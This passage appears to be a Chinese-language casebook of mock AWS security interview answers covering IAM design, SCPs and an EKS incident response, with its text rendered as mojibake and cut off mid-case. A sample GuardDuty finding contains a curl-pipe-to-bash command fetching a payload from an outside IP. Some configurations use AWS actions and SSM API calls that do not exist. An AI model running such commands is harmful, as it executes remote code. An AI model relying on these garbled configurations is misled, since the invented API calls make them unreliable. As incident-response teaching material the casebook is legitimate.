# AWSäº‘å®‰å…¨æ¶æ„é¢è¯•æ¨¡æ‹Ÿæ¡ˆä¾‹é›†

> 3ç»„çœŸå®åœºæ™¯çš„é¢è¯•æ¡ˆä¾‹ï¼Œæ¶µç›–ä¸­çº§åˆ°ä¸“å®¶çº§ï¼Œå±•ç¤ºAWSäº‘å®‰å…¨æ¶æ„ä¸“å®¶çš„æ€ç»´æ–¹å¼

---

## æ¡ˆä¾‹ç´¢å¼•

| æ¡ˆä¾‹ | éš¾åº¦ | æ ¸å¿ƒè€ƒç‚¹ | æ¶‰åŠæœåŠ¡ |
|------|------|---------|---------|
| æ¡ˆä¾‹1 | ä¸­çº§ | IAMæƒé™ç®¡ç†ã€æœ€å°æƒé™åŸåˆ™ã€RBACè®¾è®¡ | IAMã€STSã€MFA |
| æ¡ˆä¾‹2 | é«˜çº§ | å¤šè´¦æˆ·æ²»ç†ã€SCPã€Organizationsæ¶æ„è®¾è®¡ | Organizationsã€Control Towerã€Config |
| æ¡ˆä¾‹3 | ä¸“å®¶çº§ | å¨èƒæ£€æµ‹ã€äº‹ä»¶å“åº”ã€å®¹å™¨å®‰å…¨ã€EKS | GuardDutyã€Security Hubã€EKSã€Detective |

---

## æ¡ˆä¾‹1ï¼šIAMæƒé™ç®¡ç† - ä¸­çº§éš¾åº¦

### é¢è¯•å®˜æé—®

"æˆ‘ä»¬çš„å¼€å‘å›¢é˜Ÿåé¦ˆè¯´ä»–ä»¬åœ¨éƒ¨ç½²åº”ç”¨æ—¶ç»å¸¸é‡åˆ°æƒé™ä¸è¶³çš„é—®é¢˜ã€‚ä¸ºäº†å¿«é€Ÿè§£å†³ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåä¸º'PowerUserAccess'çš„IAMç­–ç•¥ï¼Œæˆäºˆäº†é™¤IAMç®¡ç†å¤–çš„æ‰€æœ‰æƒé™ã€‚ç°åœ¨è¿™ä¸ªç­–ç•¥è¢«åˆ†é…ç»™äº†50å¤šä¸ªå¼€å‘äººå‘˜ã€‚ä½ å¦‚ä½•è¯„ä»·è¿™ä¸ªæ–¹æ¡ˆ?å¦‚æœè®©ä½ é‡æ–°è®¾è®¡,ä½ ä¼šæ€ä¹ˆåš?"

---

### å€™é€‰äººå›ç­”ï¼ˆä¸“å®¶çº§ï¼‰

"è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„**è¿‡åº¦æˆæƒ(Over-privileged)**åœºæ™¯,å­˜åœ¨ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚è®©æˆ‘ä»é£é™©åˆ†æå’Œæ”¹è¿›æ–¹æ¡ˆä¸¤æ–¹é¢æ¥è¯´æ˜:

#### ğŸ”´ å½“å‰æ–¹æ¡ˆçš„é£é™©

1. **æƒé™çˆ†ç‚¸**: 50å¤šä¸ªå¼€å‘äººå‘˜æ‹¥æœ‰è¿‘ä¹ç®¡ç†å‘˜çš„æƒé™,ä»»ä½•ä¸€ä¸ªäººçš„å‡­è¯æ³„éœ²éƒ½ä¼šå½±å“æ•´ä¸ªAWSç¯å¢ƒ
2. **ç¼ºå°‘å®¡è®¡**: æ— æ³•åŒºåˆ†æ˜¯å“ªä¸ªå¼€å‘äººå‘˜æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œ(éƒ½ä½¿ç”¨åŒä¸€ä¸ªPowerUserèº«ä»½)
3. **æ¨ªå‘ç§»åŠ¨é£é™©**: æ”»å‡»è€…ä¸€æ—¦è·å–ä¸€ä¸ªå¼€å‘äººå‘˜çš„å‡­è¯,å°±å¯ä»¥è®¿é—®æ‰€æœ‰èµ„æº
4. **åˆè§„è¿è§„**: è¿åäº†PCI DSS Requirement 7(é™åˆ¶è®¿é—®æƒé™)å’ŒCIS Benchmark 1.16(é¿å…ä½¿ç”¨é€šç”¨çš„PowerUserAccessç­–ç•¥)

#### âœ… æˆ‘çš„é‡æ–°è®¾è®¡æ–¹æ¡ˆ

**ç¬¬ä¸€æ­¥:å®æ–½åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(Job-Based RBAC)**

é¦–å…ˆ,æˆ‘éœ€è¦äº†è§£å¼€å‘å›¢é˜Ÿçš„å²—ä½èŒè´£:
- **å‰ç«¯å¼€å‘**: éœ€è¦è®¿é—®S3(é™æ€èµ„æº)ã€CloudFront
- **åç«¯å¼€å‘**: éœ€è¦è®¿é—®EC2ã€RDSã€ElastiCache
- **DevOps**: éœ€è¦éƒ¨ç½²æƒé™(ECS/EKSã€Lambda)
- **æ•°æ®åˆ†æå¸ˆ**: éœ€è¦åªè¯»è®¿é—®(RDSã€Redshiftã€Athena)

ç„¶åä¸ºæ¯ä¸ªè§’è‰²åˆ›å»ºç²¾ç»†åŒ–çš„IAM Policy:

```json
{
  "PolicyName": "Developer-Frontend-ReadOnly",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowS3ReadAccess",
      "Effect": "Allow",
      "Action": [
        "s3:Get*",
        "s3:List*"
      ],
      "Resource": [
        "arn:aws:s3:::frontend-bucket",
        "arn:aws:s3:::frontend-bucket/*"
      ]
    },
    {
      "Sid": "AllowCloudFrontReadAccess",
      "Effect": "Allow",
      "Action": [
        "cloudfront:Get*",
        "cloudfront:List*"
      ],
      "Resource": "*"
    }
  ]
}
```

**ç¬¬äºŒæ­¥:ä½¿ç”¨æƒé™è¾¹ç•Œè¿›è¡Œæ·±åº¦é˜²å¾¡**

ä¸ºæ¯ä¸ªå¼€å‘äººå‘˜åˆ›å»ºIAM User,å¹¶é™„åŠ **Permissions Boundary**é™åˆ¶ä»–ä»¬çš„æœ€å¤§æƒé™:

```json
{
  "PolicyName": "DeveloperPermissionBoundary",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RestrictToDevelopmentEnvironment",
      "Effect": "Deny",
      "Action": [
        "ec2:TerminateInstances",
        "rds:DeleteDBInstance",
        "s3:DeleteBucket"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:ResourceTag/Environment": [
            "Production",
            "Staging"
          ]
        }
      }
    }
  ]
}
```

åŒæ—¶,ä½¿ç”¨**IAM Access Analyzer**éªŒè¯æ²¡æœ‰æœªæˆæƒçš„è·¨è´¦æˆ·è®¿é—®:

```bash
# æ£€æŸ¥å¤–éƒ¨è®¿é—®
aws access-analyzer list-findings --analyzer-arn arn:aws:access-analyzer:region:account:analyzer/MyAnalyzer
```

**ç¬¬ä¸‰æ­¥:å®æ–½ä¸´æ—¶å‡­è¯(AssumeRole)**

å¼€å‘äººå‘˜åœ¨éƒ¨ç½²æ—¶ä¸´æ—¶æ‰¿æ‹…`DeploymentRole`,è€Œä¸æ˜¯é•¿æœŸæŒæœ‰æƒé™:

```json
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::123456789012:role/DeploymentRole"
}
```

è¯¥`DeploymentRole`é…ç½®:
- ä»…æˆäºˆç‰¹å®šåº”ç”¨ç¯å¢ƒçš„æƒé™(åŸºäºResource Tag)
- ä½¿ç”¨**Condition**é™åˆ¶åªèƒ½åœ¨ç‰¹å®šæ—¶é—´(å·¥ä½œæ—¥9-18ç‚¹)å’Œä»ç‰¹å®šIP(CIDR)è®¿é—®
- å¯ç”¨**MFA**å¼ºåˆ¶è¦æ±‚

```json
{
  "PolicyName": "DeploymentRolePolicy",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowDeploymentToSpecificEnvironment",
      "Effect": "Allow",
      "Action": [
        "ecs:UpdateService",
        "eks:CreateDeployment"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "ecs:cluster": "arn:aws:ecs:region:account:cluster/development-cluster"
        },
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "true"
        },
        "IpAddress": {
          "aws:SourceIp": [
            "203.0.113.0/24"
          ]
        },
        "DateGreaterThan": {
          "aws:CurrentTime": "2025-01-19T09:00:00Z"
        },
        "DateLessThan": {
          "aws:CurrentTime": "2025-01-19T18:00:00Z"
        }
      }
    }
  ]
}
```

**ç¬¬å››æ­¥:åŸºç¡€è®¾æ–½å³ä»£ç (IaC)é›†æˆ**

æœ€ä½³å®è·µæ˜¯:å¼€å‘äººå‘˜ä¸ç›´æ¥æ“ä½œAWS,è€Œæ˜¯æäº¤ä»£ç åˆ°Git,ç”±CI/CD Pipelineè‡ªåŠ¨éƒ¨ç½²:

```yaml
# .github/workflows/deploy.yml
name: Deploy to Development
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v3
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeploymentRole
          aws-region: us-east-1
      - name: Deploy to ECS
        run: |
          aws ecs update-service --cluster dev-cluster --service web-app --task-definition $(aws ecs register-task-definition --cli-input-json file://task-definition.json | jq -r '.taskDefinition.taskDefinitionArn')
```

Pipelineä½¿ç”¨ä¸“ç”¨çš„**OIDC Role**è€Œä¸æ˜¯é•¿æœŸAccess Keys,å¹¶ä¸”:
- å®æ–½åŒäººå®¡æ‰¹æœºåˆ¶(Productionç¯å¢ƒéœ€è¦æ¶æ„å¸ˆå®¡æ‰¹)
- è‡ªåŠ¨è¿è¡Œå®‰å…¨æ‰«æ(Trivyã€Snyk)
- è‡ªåŠ¨è¿è¡Œåˆè§„æ£€æŸ¥(AWS Config)

**ç¬¬äº”æ­¥:æŒç»­ç›‘æ§**

- å¯ç”¨**CloudTrail**è®°å½•æ‰€æœ‰APIè°ƒç”¨(åŒ…æ‹¬AssumeRole)
- é…ç½®**GuardDuty**æ£€æµ‹å¼‚å¸¸çš„IAMè¡Œä¸º(å¦‚æœªæˆæƒçš„AssumeRoleå°è¯•ã€å¼‚å¸¸çš„ç™»å½•åœ°ç‚¹)
- å®šæœŸå®¡æŸ¥**IAM Access Advisor**æŠ¥å‘Š,ç§»é™¤æœªä½¿ç”¨çš„æƒé™

```bash
# ç”ŸæˆIAM Access AdvisoræŠ¥å‘Š
aws iam get-account-authorization-details --output json > iam_details.json
```

#### é¢„æœŸæ•ˆæœ

- âœ… éµå¾ª**æœ€å°æƒé™åŸåˆ™**,æ¯ä¸ªå¼€å‘äººå‘˜ä»…æ‹¥æœ‰å®Œæˆå·¥ä½œæ‰€éœ€çš„æœ€å°æƒé™
- âœ… ç¬¦åˆ**çºµæ·±é˜²å¾¡**ç­–ç•¥(Permissions Boundary + AssumeRole + MFA + Condition)
- âœ… æé«˜å¯å®¡è®¡æ€§,æ¯ä¸ªæ“ä½œéƒ½å¯ä»¥è¿½æº¯åˆ°å…·ä½“ä¸ªäºº
- âœ… å‡å°‘å‡­è¯æ³„éœ²çš„**çˆ†ç‚¸åŠå¾„(Blast Radius)**(å¦‚æœå¼€å‘äººå‘˜å‡­è¯æ³„éœ²,ä»…å½±å“æœ‰é™èµ„æº)
- âœ… ç¬¦åˆåˆè§„è¦æ±‚(PCI DSSã€CIS Benchmark)

#### æˆæœ¬ä¼˜åŒ–

- ä½¿ç”¨IAM Access Analyzerè¯†åˆ«æœªä½¿ç”¨çš„æƒé™,å‡å°‘è¿‡åº¦æˆæƒ
- ä½¿ç”¨IAM Access Advisorè‡ªåŠ¨åŒ–æƒé™å®¡æŸ¥
- é€šè¿‡ç²¾ç»†åŒ–çš„æƒé™æ§åˆ¶,é™ä½å®‰å…¨äº‹ä»¶çš„æ½œåœ¨æŸå¤±"

---

## æ¡ˆä¾‹2ï¼šå¤šè´¦æˆ·æ²»ç†æ¶æ„ - é«˜çº§éš¾åº¦

### é¢è¯•å®˜æé—®

"æˆ‘ä»¬å…¬å¸è®¡åˆ’å°†AWSç¯å¢ƒä»å•ä¸ªè´¦æˆ·è¿ç§»åˆ°å¤šè´¦æˆ·æ¶æ„,ä»¥æ”¯æŒå¤šä¸ªä¸šåŠ¡çº¿ã€‚ä¸šåŠ¡çº¿éœ€è¦è‡ªä¸»ç®¡ç†ä»–ä»¬çš„èµ„æº,ä½†é›†ä¸­å®‰å…¨å›¢é˜Ÿéœ€è¦ç¡®ä¿åˆè§„æ€§ã€‚ä½ ä¼šå¦‚ä½•è®¾è®¡è¿™ä¸ªå¤šè´¦æˆ·æ¶æ„?è¯·è¯¦ç»†è¯´æ˜Organizationsç»“æ„ã€SCPç­–ç•¥å’Œé˜²æŠ¤æœºåˆ¶ã€‚"

---

### å€™é€‰äººå›ç­”ï¼ˆä¸“å®¶çº§ï¼‰

"è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„**é›†ä¸­æ²»ç† + ä¸šåŠ¡è‡ªä¸»**çš„åœºæ™¯ã€‚æˆ‘ä¼šåŸºäº**AWS Security Reference Architecture (SRA)** å’Œ **Control Tower** æ¥è®¾è®¡ã€‚è®©æˆ‘åˆ†å±‚è¯´æ˜:

#### ğŸ“Š å¤šè´¦æˆ·ç»„ç»‡æ¶æ„è®¾è®¡

åŸºäºAWS SRAæœ€ä½³å®è·µ,æˆ‘æ¨èä»¥ä¸‹å¤šè´¦æˆ·ç»“æ„:

```
Root
â”œâ”€â”€ Security OU (é›†ä¸­ç®¡ç†)
â”‚   â”œâ”€â”€ Log Archive Account (CloudTrail + Config + S3)
â”‚   â”œâ”€â”€ Security Account (GuardDuty + Security Hub + Detective)
â”‚   â””â”€â”€ Audit Account (ç¬¬ä¸‰æ–¹å®¡è®¡å·¥å…·)
â”‚
â”œâ”€â”€ Shared Services OU
â”‚   â”œâ”€â”€ Network Account (Transit Gateway + VPC + Direct Connect)
â”‚   â”œâ”€â”€ Identity Account (IAM Identity Center)
â”‚   â””â”€â”€ DevOps Account (CI/CD + Artifacts)
â”‚
â”œâ”€â”€ Production OU
â”‚   â”œâ”€â”€ Business-Unit-A (EKSé›†ç¾¤ + RDS)
â”‚   â”œâ”€â”€ Business-Unit-B (EC2 + Auto Scaling)
â”‚   â””â”€â”€ Business-Unit-C (Lambda + DynamoDB)
â”‚
â”œâ”€â”€ Development OU
â”‚   â”œâ”€â”€ Sandbox Accounts (å¼€å‘äººå‘˜æ²™ç®±)
â”‚   â”œâ”€â”€ CI/CD Accounts (æ„å»ºå’Œæµ‹è¯•)
â”‚   â””â”€â”€ Staging Accounts (é¢„ç”Ÿäº§)
â”‚
â””â”€â”€ Suspended OU (æš‚åœçš„è´¦æˆ·)
```

**è´¦æˆ·æ•°é‡è§„åˆ’:**
- åˆæœŸ: 15-20ä¸ªè´¦æˆ·
- ä¸­æœŸ: 50-100ä¸ªè´¦æˆ·
- é•¿æœŸ: æ¯ä¸ªåº”ç”¨/æœåŠ¡ç‹¬ç«‹è´¦æˆ·(å¾®æœåŠ¡æ¶æ„)

#### ğŸ”’ SCPç­–ç•¥è®¾è®¡(ä¸‰å±‚é˜²æŠ¤)

**ç¬¬ä¸€å±‚:Rootçº§SCP - åŸºç¡€å®‰å…¨åŸºçº¿**

åœ¨Rootçº§åˆ«åº”ç”¨å…¨å±€å®‰å…¨åŸºçº¿,æ‰€æœ‰OUå’ŒAccountè‡ªåŠ¨ç»§æ‰¿:

```json
{
  "PolicyName": "RootBaseline",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyUnencryptedInTransit",
      "Effect": "Deny",
      "Action": [
        "s3:*",
        "dynamodb:*",
        "es:*"
      ],
      "Resource": "*",
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    },
    {
      "Sid": "DenyRootUser",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:root"
        }
      }
    },
    {
      "Sid": "RequireMFAForConsole",
      "Effect": "Deny",
      "NotAction": [
        "iam:CreateVirtualMFADevice",
        "iam:EnableMFADevice",
        "iam:GetUser",
        "iam:ListMFADevices",
        "iam:ListVirtualMFADevices",
        "iam:ResyncMFADevice",
        "iam:ChangePassword",
        "iam:GetAccountPasswordPolicy"
      ],
      "Resource": "*",
      "Condition": {
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "false"
        }
      }
    },
    {
      "Sid": "DenyRegions",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": [
            "us-east-1",
            "us-west-2",
            "eu-west-1"
          ]
        }
      }
    }
  ]
}
```

**ç¬¬äºŒå±‚:OUçº§SCP - ç»†ç²’åº¦æ§åˆ¶**

**Development OU SCP:**
```json
{
  "PolicyName": "DevelopmentRestrictions",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyProductionResources",
      "Effect": "Deny",
      "Action": [
        "ec2:TerminateInstances",
        "rds:DeleteDBInstance",
        "eks:DeleteCluster"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:ResourceTag/Environment": "Production"
        }
      }
    },
    {
      "Sid": "DenyPublicIP",
      "Effect": "Deny",
      "Action": "ec2:AssociateAddress",
      "Resource": "*"
    },
    {
      "Sid": "DenyLargeInstances",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": [
        "arn:aws:ec2:*:*:instance/*"
      ],
      "Condition": {
        "StringLike": {
          "ec2:InstanceType": [
            "*.metal",
            "*.24xlarge",
            "*.32xlarge"
          ]
        }
      }
    }
  ]
}
```

**Production OU SCP:**
```json
{
  "PolicyName": "ProductionRestrictions",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyDirectConsoleAccess",
      "Effect": "Deny",
      "Action": [
        "ec2:GetConsoleOutput",
        "ec2:GetConsoleScreenshot"
      ],
      "Resource": "*"
    },
    {
      "Sid": "RequireEncryptionAtRest",
      "Effect": "Deny",
      "Action": [
        "ec2:CreateVolume",
        "rds:CreateDBInstance",
        "s3:PutObject"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "kms:EncryptionContext:aws:ec2:volume/encrypted": "true"
        }
      }
    },
    {
      "Sid": "DenyManualChanges",
      "Effect": "Deny",
      "Action": [
        "ec2:Modify*",
        "rds:Modify*"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalTag/ManagedBy": "terraform"
        }
      }
    }
  ]
}
```

**ç¬¬ä¸‰å±‚:Accountçº§Tags + IAM Policies - åº”ç”¨çº§æ§åˆ¶**

- ä½¿ç”¨**æ ‡ç­¾ç­–ç•¥**å¼ºåˆ¶æ‰€æœ‰èµ„æºæ‰“ä¸Š`CostCenter`ã€`Environment`ã€`Compliance`æ ‡ç­¾
- ä¸šåŠ¡çº¿è´Ÿè´£äººå¯ä»¥åœ¨SCPè¾¹ç•Œå†…è‡ªè¡Œç®¡ç†IAM Policy

```json
{
  "PolicyName": "TagPolicy",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RequireEnvironmentTag",
      "Effect": "Deny",
      "Action": [
        "ec2:RunInstances",
        "s3:PutObject",
        "rds:CreateDBInstance"
      ],
      "Resource": "*",
      "Condition": {
        "Null": {
          "aws:RequestTag/Environment": "true"
        }
      }
    }
  ]
}
```

#### ğŸ›¡ï¸ é˜²æŠ¤æœºåˆ¶

**é¢„é˜²æ€§é˜²æŠ¤(Preventive Controls):**

1. **Control Tower**
   - è‡ªåŠ¨åŒ–Landing Zoneéƒ¨ç½²
   - æŒç»­drift detection(é…ç½®æ¼‚ç§»æ£€æµ‹)
   - é¢„é…ç½®Guardrails(é˜²æŠ¤è§„åˆ™)

2. **Service Control Policies (SCPs)**
   - ç»„ç»‡çº§æƒé™è¾¹ç•Œ
   - å¼ºåˆ¶å®æ–½å®‰å…¨åŸºçº¿
   - é˜²æ­¢æ„å¤–åˆ é™¤å…³é”®èµ„æº

3. **AWS Config Rules**
   - æŒç»­åˆè§„æ£€æŸ¥
   - è‡ªåŠ¨ä¿®å¤(å¦‚`encrypted-volumes`ã€`no-public-s3-buckets`)
   - ç¤ºä¾‹è§„åˆ™:
     ```json
     {
       "ConfigRuleName": "required-tags",
       "Source": {
         "Owner": "AWS",
         "SourceIdentifier": "REQUIRED_TAGS"
       },
       "InputParameters": {
         "requiredTagKeys": "Environment,CostCenter,Owner"
       }
     }
     ```

4. **IAM Access Analyzer**
   - éªŒè¯æœªæˆæƒçš„è·¨è´¦æˆ·è®¿é—®
   - æ£€æµ‹Public S3 Bucket
   - æ£€æµ‹è¿‡å®½çš„IAM Policy

**æ£€æµ‹æ€§é˜²æŠ¤(Detective Controls):**

1. **GuardDuty** (å¯ç”¨æ‰€æœ‰ä¿æŠ¤è®¡åˆ’)
   - S3 Protection(æ£€æµ‹å¼‚å¸¸S3æ´»åŠ¨)
   - EKS Protection(æ£€æµ‹Kuberneteså¼‚å¸¸)
   - Runtime Monitoring(æ£€æµ‹å®¹å™¨è¿è¡Œæ—¶å¨èƒ)
   - Malware Protection(EC2å’ŒS3æ¶æ„è½¯ä»¶æ‰«æ)

2. **Security Hub** (èšåˆæ‰€æœ‰å®‰å…¨å‘ç°)
   - CIS AWS Foundations Benchmark(100+æ£€æŸ¥)
   - NIST CSFæ¡†æ¶
   - PCI DSSæ ‡å‡†
   - è‡ªå®šä¹‰æ§ä»¶

3. **CloudTrail Lake**
   - 10å¹´å®¡è®¡è½¨è¿¹å­˜å‚¨
   - äº‹ä»¶æ•°æ®å­˜å‚¨(Event Data Store)
   - é«˜çº§äº‹ä»¶é€‰æ‹©å™¨
   - ä¸å¯å˜æ—¥å¿—(WORM)

4. **VPC Flow Logs**
   - ç½‘ç»œæµé‡åˆ†æ
   - å‘é€åˆ°CloudWatch Logs/S3
   - ä½¿ç”¨Amazon Detectiveåˆ†æ

**è‡ªåŠ¨åŒ–å“åº”(Automated Response):**

```yaml
# EventBridge Rule for GuardDuty Findings
Source: aws.guardduty
Detail-Type: GuardDuty Finding
Detail:
  severity: [7, 8, 8.5, 9]
Action:
  - IsolateEC2Instance:
      Description: Detach SG and change to quarantine SG
      Automation: SSM Automation Document
  - NotifySOC:
      Description: Send alert to security team
      Integration: SNS Topic + PagerDuty
  - CreateJiraTicket:
      Description: Create incident ticket
      Integration: Jira API
  - UpdateSecurityHub:
      Description: Update finding workflow status
      Integration: Security Hub API
```

#### ğŸ“‹ åˆè§„æ€§è‡ªåŠ¨åŒ–

**Audit Manager:**
- è‡ªåŠ¨ç”ŸæˆPCI DSSå®¡è®¡æŠ¥å‘Š
- è‡ªåŠ¨ç”ŸæˆISO 27001å®¡è®¡æŠ¥å‘Š
- è‡ªå®šä¹‰æ§ä»¶æ¡†æ¶
- å¹´åº¦å®¡è®¡è¯æ®æ”¶é›†

**AWS Config Aggregator:**
- è·¨è´¦æˆ·åˆè§„çŠ¶æ€ç»Ÿä¸€è§†å›¾
- åˆè§„ä»ªè¡¨æ¿
- å†å²åˆè§„è¶‹åŠ¿

**Security Hub Custom Insights:**
```json
{
  "InsightName": "High-Severity-Findings",
  "Filters": {
    "SeverityLabel": [
      "CRITICAL",
      "HIGH"
    ],
    "WorkflowStatus": [
      "NEW"
    ]
  }
}
```

#### ğŸš€ å®æ–½è·¯çº¿å›¾

**Phase 1: åŸºç¡€è®¾æ–½éƒ¨ç½²(1-2ä¸ªæœˆ)**
1. éƒ¨ç½²AWS Control Tower Landing Zone
2. åˆ›å»ºæ ¸å¿ƒOU(Securityã€Shared Services)
3. é…ç½®Rootçº§åˆ«SCP
4. éƒ¨ç½²Log Archiveå’ŒSecurity Account

**Phase 2: ä¸šåŠ¡çº¿è¿ç§»(3-6ä¸ªæœˆ)**
1. åˆ›å»ºProductionå’ŒDevelopment OU
2. é…ç½®OUçº§åˆ«SCP
3. è¿ç§»ç°æœ‰å·¥ä½œè´Ÿè½½åˆ°å¤šè´¦æˆ·
4. å¯ç”¨GuardDutyå’ŒSecurity Hub

**Phase 3: æŒç»­ä¼˜åŒ–(æŒç»­)**
1. å®šæœŸå®¡æŸ¥SCP(æ¯å­£åº¦)
2. ä¼˜åŒ–Config Rules(åŸºäºå‘ç°çš„é—®é¢˜)
3. è‡ªåŠ¨åŒ–å“åº”playbooks
4. æˆæœ¬ä¼˜åŒ–(å®¡æŸ¥æœªä½¿ç”¨çš„èµ„æº)

#### é¢„æœŸæ•ˆæœ

- âœ… é›†ä¸­å®‰å…¨å›¢é˜Ÿåœ¨Rootå’ŒOUå±‚å®æ–½**æ²»ç†æŠ¤æ **
- âœ… ä¸šåŠ¡çº¿åœ¨è¾¹ç•Œå†…æ‹¥æœ‰**å®Œå…¨è‡ªä¸»æƒ**
- âœ… è‡ªåŠ¨åŒ–åˆè§„æ£€æŸ¥,å‡å°‘**äººå·¥å®¡è®¡æˆæœ¬70%**
- âœ… ç¬¦åˆ**è´£ä»»å…±æ‹…æ¨¡å‹**,å®‰å…¨å›¢é˜Ÿè´Ÿè´£é˜²æŠ¤,ä¸šåŠ¡çº¿è´Ÿè´£åº”ç”¨å®‰å…¨
- âœ… é™ä½**é…ç½®æ¼‚ç§»é£é™©**(Config + Control ToweræŒç»­ç›‘æ§)
- âœ… æé«˜**äº‹ä»¶å“åº”é€Ÿåº¦**(EventBridgeè‡ªåŠ¨åŒ–)"

---

## æ¡ˆä¾‹3ï¼šå¨èƒæ£€æµ‹ä¸äº‹ä»¶å“åº” - ä¸“å®¶çº§éš¾åº¦

### é¢è¯•å®˜æé—®

"å‡Œæ™¨3ç‚¹,ä½ çš„Security Hubæ”¶åˆ°äº†ä¸€ä¸ªGuardDutyçš„'Critical'çº§åˆ«å‘ç°:'Execution:EKSRuntime/ProcessExecutionInContainer',æç¤ºç”Ÿäº§ç¯å¢ƒçš„EKSé›†ç¾¤ä¸­æœ‰ä¸€ä¸ªå®¹å™¨æ­£åœ¨æ‰§è¡Œæ¶æ„shellã€‚ä½œä¸ºå®‰å…¨æ¶æ„å¸ˆ,ä½ ä¼šå¦‚ä½•è¿›è¡Œäº‹ä»¶å“åº”?è¯·è¯¦ç»†è¯´æ˜ä½ çš„è°ƒæŸ¥æµç¨‹ã€å†³ç­–ä¾æ®å’Œä¿®å¤ç­–ç•¥ã€‚"

---

### å€™é€‰äººå›ç­”ï¼ˆä¸“å®¶çº§ï¼‰

"è¿™æ˜¯ä¸€ä¸ª**çœŸå®çš„å®¹å™¨é€ƒé€¸æˆ–ä¾›åº”é“¾æ”»å‡»**åœºæ™¯,éœ€è¦åœ¨åˆ†é’Ÿçº§å“åº”ã€‚æˆ‘ä¼šæŒ‰ç…§**NIST Incident Response Lifecycle**(å‡†å¤‡â†’æ£€æµ‹â†’åˆ†æâ†’éåˆ¶â†’æ ¹é™¤â†’æ¢å¤)æ¥æ‰§è¡Œã€‚

#### âš¡ ç¬¬ä¸€é˜¶æ®µ:å³æ—¶å“åº”(0-15åˆ†é’Ÿ) - è‡ªåŠ¨éåˆ¶

**æ­¥éª¤1:è§¦å‘è‡ªåŠ¨åŒ–å“åº”playbook**

å½“GuardDutyæ£€æµ‹åˆ°Criticalçº§åˆ«å‘ç°æ—¶,EventBridgeè‡ªåŠ¨è§¦å‘å“åº”æµç¨‹:

```python
# EventBridge Event Pattern
{
  "source": ["aws.guardduty"],
  "detail-type": ["GuardDuty Finding"],
  "detail": {
    "severity": [{ "numeric": [">=", 8.5] }],
    "type": ["Execution:EKSRuntime/ProcessExecutionInContainer"]
  }
}
```

**è‡ªåŠ¨æ‰§è¡Œçš„åŠ¨ä½œ:**
```yaml
# SSM Automation Document
description: Isolate compromised Pod
steps:
  - name: isolatePod
    action: aws:executeAwsApi
    inputs:
      Service: eks
      Api: UpdatePod
      ClusterName: production-cluster
      PodName: "{{ finding.resource.containerDetails.containerName }}"
      NetworkPolicy: deny-all

  - name: captureMemoryDump
    action: aws:executeAwsApi
    inputs:
      Service: ec2
      Api: CreateImage
      InstanceId: "{{ finding.resource.instanceDetails.instanceId }}"
      Name: "forensics-{{ finding.id }}"

  - name: notifySOC
    action: aws:sns
    inputs:
      TopicArn: arn:aws:sns:us-east-1:123456789012:security-alerts
      Message: "Critical GuardDuty Finding: {{ finding.title }}"

  - name: createJiraTicket
    action: aws:executeAwsApi
    inputs:
      Service: jira
      Api: CreateIssue
      Project: SEC
      Summary: "[P1] GuardDuty Critical: {{ finding.id }}"
      Priority: Critical
```

**æ­¥éª¤2:å¯åŠ¨EKS Runtime Monitoring**

æ£€æŸ¥GuardDuty Finding details:

```json
{
  "findingType": "Execution:EKSRuntime/ProcessExecutionInContainer",
  "severity": 9,
  "createdAt": "2025-01-19T03:00:00Z",
  "resource": {
    "resourceType": "EKSCluster",
    "details": {
      "eksClusterDetails": {
        "name": "production-cluster",
        "arn": "arn:aws:eks:us-east-1:123456789012:cluster/production-cluster"
      },
      "containerDetails": {
        "containerId": "abcd1234efgh5678",
        "name": "web-app",
        "image": "123456789012.dkr.ecr.us-east-1.amazonaws.com/web-app:latest",
        "podName": "web-app-7f8d9-abcde"
      },
      "instanceDetails": {
        "instanceId": "i-0123456789abcdef0",
        "instanceType": "m5.large",
        "launchTime": "2025-01-18T10:00:00Z"
      }
    },
    "evidence": {
      "processName": "/bin/bash",
      "commandLine": "curl http://45.33.32.156/payload.sh | bash",
      "userId": "0",
      "groupId": "0"
    }
  }
}
```

**å…³é”®å‘ç°:**
- å®¹å™¨ä»¥**rootç”¨æˆ·**(userId=0)è¿è¡Œ(é«˜å±!)
- æ‰§è¡Œäº†**curl | bash**(å…¸å‹æ¶æ„è½¯ä»¶ä¸‹è½½æ–¹å¼)
- è¿æ¥åˆ°**å¤–éƒ¨IP**(45.33.32.156)éœ€è¦è°ƒæŸ¥

#### ğŸ” ç¬¬äºŒé˜¶æ®µ:æ·±åº¦è°ƒæŸ¥(15-60åˆ†é’Ÿ) - æ”»å‡»é“¾åˆ†æ

